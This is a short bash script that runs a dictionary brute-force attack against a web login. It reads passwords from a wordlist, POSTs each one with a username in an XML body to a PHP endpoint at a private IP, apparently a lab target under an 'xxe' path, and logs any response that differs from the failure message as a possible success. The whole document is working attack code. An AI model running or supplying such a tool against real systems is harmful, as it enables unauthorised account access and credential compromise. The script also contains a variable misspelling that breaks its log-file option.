#!/bin/bash

# read lines 
# for everyline do something
# think about sleep between requests


WORDLIST=$1
USERNAME=$2
LOGFILE=$3
SLEEP=$4

COUNT=0

if [ ! "$LOFILE" ];then
 LOGFILE="/tmp/brute.log"
fi

if [ "$#" -lt 2 ];then
 echo "Missing dictionary or username!"
 exit 1
fi

echo "start:" `date` >> $LOGFILE

# trap exit

function finish {
  echo "Program catched EXIT!"
  echo "caught exit:"`date` >> $LOGFILE
}

trap finish EXIT

# main fun here

for PASSWORD in `cat $1`
  do

  # main part here:
  output=$(curl -s -k -X $'POST' \
    -H $'Host: 192.168.43.163' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Content-Type: text/plain;charset=UTF-8' -H $'Connection: close' -H $'Referer: http://192.168.43.163/xxe/' \
    --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><name>$USERNAME</name><password>$PASSWORD</password></root>" \
    $'http://192.168.43.163/xxe/xxe.php') 
 sleep $SLEEP

 let COUNT=COUNT+1
 # echo "Guessing:$COUNT:$USERNAME:$PASSWORD"
 if [[ "$output" == "Sorry, this admin not available!" ]];then
  echo "COUNT:$COUNT:INVALID ATTEMPT:$USERNAME:$PASSWORD" 
 else
  echo "SUCCESS OR CHANGE:$COUNT:$USERNAME:$PASSWORD" | tee -a $LOGFILE
 fi
done

echo "attack finished:"`date` >> $LOGFILE
